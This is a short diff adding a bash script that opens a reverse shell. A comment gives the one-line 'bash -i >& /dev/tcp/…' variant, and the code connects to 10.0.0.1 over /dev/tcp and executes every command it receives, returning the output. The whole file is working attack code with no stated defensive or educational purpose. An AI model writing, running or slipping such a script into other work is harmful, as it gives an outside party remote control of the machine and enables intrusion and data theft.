@@ -1,0 +1,6 @@
+#!/bin/bash
+# or run:
+#   bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+exec 5<>/dev/tcp/10.0.0.1/80
+while read line 0<&5; do $line 2>&5 >&5; done
